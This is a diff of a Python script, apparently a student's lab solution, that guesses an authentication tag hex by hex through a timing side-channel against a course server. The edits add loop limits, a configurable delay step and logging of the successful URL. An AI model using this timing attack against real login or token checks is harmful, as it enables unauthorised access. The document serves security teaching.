@@ -8,10 +8,14 @@ import requests
 #-------------------------------------------------------------------------------------------
 #GLOBAL VARIABLES
 #-------------------------------------------------------------------------------------------
+max_delay = 100
+max_tries_per_delay = 5
+delay_interval = 5
+
 charlist = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
 
 delay = 10
-name = "axelalvi"
+name = "lukaaxel"
 
 url = "http://dart.cse.kau.se:12345/auth/" + str(delay) + "/" + name + "/"
 
@@ -77,14 +81,14 @@ time.sleep(2)
 #-------------------------------------------------------------------------------------------
 #test until response is 200 (be patient)
 #-------------------------------------------------------------------------------------------
-while(True):
+while(delay < max_delay):
 
     url = "http://dart.cse.kau.se:12345/auth/" + str(delay) + "/" + name + "/"
     #delay += 10
     print("Testing delay: " + str(delay))
     time.sleep(2)
     count_runs = 0
-    while(count_runs < 5):
+    while(count_runs < max_tries_per_delay):
         count_runs += 1
         #-------------------------------------------------------------------------------------------
         #find first hex in tag that by checking which one gives back a response time inside desired interval
@@ -116,7 +120,7 @@ while(True):
         #go through guessed tag hex by hex, until only hex remains
         #-------------------------------------------------------------------------------------------
         i = 1
-        while i < len(guessedtag) - 1:
+        while i < (len(guessedtag) - 1):
 
             current_longest = -100
             sweetspot_top = (i + 1) * delay + general_rsp_time
@@ -124,6 +128,7 @@ while(True):
             minimum_rsp_time = i * delay
 
             #if rq_time is less than i * delay, we know we guessed wrong and want to try previous i again
+            #work OK but not all the time for some reason....
             if wrong_guess is True:
                 if i < 3:
                     wrong_guess = False
@@ -177,7 +182,7 @@ while(True):
                 print("Testing: " + url + listtostring(guessedtag))
                 if str(re) == "<Response [200]>":
                     print("OK! Correct: " + url + listtostring(guessedtag))
-                    appentofile("Delay: " + str(delay) + ", URL: " + url + listtostring(guessedtag))
+                    appentofile("Delay: " + str(delay) + ", URL: " + url + listtostring(guessedtag) + "\n")
                     break
         #-------------------------------------------------------------------------------------------
 
@@ -189,6 +194,6 @@ while(True):
             print("OK!")
             break
         #-------------------------------------------------------------------------------------------
-    delay += 10
+    delay += delay_interval
 #-------------------------------------------------------------------------------------------
 
